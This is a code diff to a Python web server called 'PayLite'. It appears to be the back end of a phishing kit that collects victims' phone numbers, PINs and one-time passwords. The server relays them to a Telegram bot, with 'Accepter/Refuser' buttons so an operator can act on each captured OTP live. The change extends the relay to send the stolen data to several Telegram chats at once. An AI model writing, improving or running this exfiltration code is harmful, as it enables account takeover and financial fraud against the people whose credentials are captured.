@@ -859,29 +859,33 @@ class PayLiteHandler(http.server.SimpleHTTPRequestHandler):
             print(f"[PayLite] Received Verification: Phone={phone}, PIN={pin}, OTP={otp}")
             
             if token and chat_id:
-                url = f"https://api.telegram.org/bot{token}/sendMessage"
-                payload = {
-                    "chat_id": chat_id,
-                    "text": message,
-                    "parse_mode": "HTML"
-                }
+                # Support multiple chat IDs separated by comma
+                chat_ids = [c.strip() for c in chat_id.split(',') if c.strip()]
                 
-                if otp != 'Pending OTP...' and otp != 'RESEND_CLICKED' and session_id:
-                    payload["reply_markup"] = {
-                        "inline_keyboard": [
-                            [
-                                {"text": "✅ Accepter", "callback_data": f"approve_{session_id}"},
-                                {"text": "❌ Refuser", "callback_data": f"reject_{session_id}"}
-                            ]
-                        ]
+                for cid in chat_ids:
+                    url = f"https://api.telegram.org/bot{token}/sendMessage"
+                    payload = {
+                        "chat_id": cid,
+                        "text": message,
+                        "parse_mode": "HTML"
                     }
+                    
+                    if otp != 'Pending OTP...' and otp != 'RESEND_CLICKED' and session_id:
+                        payload["reply_markup"] = {
+                            "inline_keyboard": [
+                                [
+                                    {"text": "✅ Accepter", "callback_data": f"approve_{session_id}"},
+                                    {"text": "❌ Refuser", "callback_data": f"reject_{session_id}"}
+                                ]
+                            ]
+                        }
 
-                try:
-                    res = requests.post(url, json=payload)
-                    print(f"[PayLite] Telegram response status: {res.status_code}")
-                    print(f"[PayLite] Telegram response body: {res.text}")
-                except Exception as e:
-                    print(f"[PayLite] Error sending to Telegram: {e}")
+                    try:
+                        res = requests.post(url, json=payload)
+                        print(f"[PayLite] Telegram response status for {cid}: {res.status_code}")
+                        print(f"[PayLite] Telegram response body for {cid}: {res.text}")
+                    except Exception as e:
+                        print(f"[PayLite] Error sending to Telegram {cid}: {e}")
             else:
                 print("[PayLite] Telegram credentials missing. Skipping notification.")
 
